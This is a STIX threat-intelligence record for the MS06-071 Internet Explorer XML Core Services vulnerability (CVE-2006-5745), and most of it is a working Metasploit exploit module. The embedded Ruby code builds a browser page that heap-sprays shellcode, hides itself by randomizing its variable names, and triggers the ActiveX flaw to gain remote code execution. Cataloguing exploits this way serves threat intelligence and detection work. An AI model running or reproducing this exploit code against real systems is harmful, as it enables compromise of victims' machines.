{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b874679b-17f4-41ee-8b47-7e90d9b1e463",
    "created": "2024-08-14T16:40:39.016792Z",
    "modified": "2024-08-14T16:40:39.016796Z",
    "name": "MS06-071 Microsoft Internet Explorer XML Core Services HTTP Request Handling",
    "description": " This module exploits a code execution vulnerability in Microsoft XML Core Services which exists in the XMLHTTP ActiveX control. This module is the modified version of http://www.milw0rm.com/exploits/2743 - credit to str0ke. This module has been successfully tested on Windows 2000 SP4, Windows XP SP2, Windows 2003 Server SP0 with IE6 + Microsoft XML Core Services 4.0 SP2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms06_071_xml_core.rb",
            "external_id": "ms06_071_xml_core.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5745"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-071 Microsoft Internet Explorer XML Core Services HTTP Request Handling',\n      'Description'    => %q{\n          This module exploits a code execution vulnerability in Microsoft XML Core Services which\n        exists in the XMLHTTP ActiveX control. This module is the modified version of\n        http://www.milw0rm.com/exploits/2743 - credit to str0ke. This module has been successfully\n        tested on Windows 2000 SP4, Windows XP SP2, Windows 2003 Server SP0 with IE6\n        + Microsoft XML Core Services 4.0 SP2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Trirat Puttaraksa <trir00t[at]gmail.com>',\n        ],\n      'References'     =>\n        [\n          ['CVE',   '2006-5745' ],\n          ['OSVDB', '29425' ],\n          ['MSB',   'MS06-071' ],\n          ['BID',   '20915' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 1024,\n          'BadChars'       => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 SP4 -> Windows 2003 SP0', {'Ret' => 0x0c0c0c0c} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-10-10'))\n  end\n\n  def on_request_uri(cli, request)\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Get a unicode friendly version of the return address\n    addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]\n\n    # Randomize the javascript variable names\n    var_buffer    = rand_text_alpha(rand(30)+2)\n    var_shellcode = rand_text_alpha(rand(30)+2)\n    var_unescape  = rand_text_alpha(rand(30)+2)\n    var_x         = rand_text_alpha(rand(30)+2)\n    var_i         = rand_text_alpha(rand(30)+2)\n\n    var_size      = rand_text_alpha(rand(30)+2)\n    var_nopsize   = rand_text_alpha(rand(30)+2)\n    var_limit     = rand_text_alpha(rand(30)+2)\n\n    var_obj\t      = rand_text_alpha(rand(30)+2)\n    var_id\t      = rand_text_alpha(rand(30)+2)\n\n\n    # Build out the message\n    content = %Q|\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<body>\n<object id=#{var_id} classid=\"CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}\">\n</object>\n<script>\n\n  var #{var_unescape}  = unescape ;\n  var #{var_shellcode} = #{var_unescape}( \"#{shellcode}\" ) ;\n\n  var #{var_size} = #{var_shellcode}.length * 2;\n  var #{var_nopsize} = 0x400000 - (#{var_size} + 0x38);\n  var #{var_buffer} = #{var_unescape}( \"%u#{addr_word}\" ) ;\n\n  while (#{var_buffer}.length * 2 < #{var_nopsize}) #{var_buffer}+=#{var_buffer} ;\n\n  #{var_limit} = (0x12000000 - 0x400000) / 0x400000;\n  var #{var_x} = new Array() ;\n  for ( var #{var_i} =0 ; #{var_i} < #{var_limit} ; #{var_i}++ ) {\n    #{var_x}[ #{var_i} ] =\n      #{var_buffer} + #{var_shellcode};\n  }\n\n  var #{var_obj} = null;\n  #{var_obj} = document.getElementById('#{var_id}').object;\n\n  try {\n    #{var_obj}.open(new Array(), new Array(), new Array(), new Array(), new Array());\n  } catch(e) {};\n\n  #{var_obj}.open(new Object(), new Object(), new Object(), new Object(), new Object());\n\n  #{var_obj}.setRequestHeader( new Object(), '......' );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n  #{var_obj}.setRequestHeader( new Object(), 0x12345678 );\n\n</script>\n</body>\n</html>\n    |\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-10-10",
    "x_mitre_platforms": [
        "win'"
    ]
}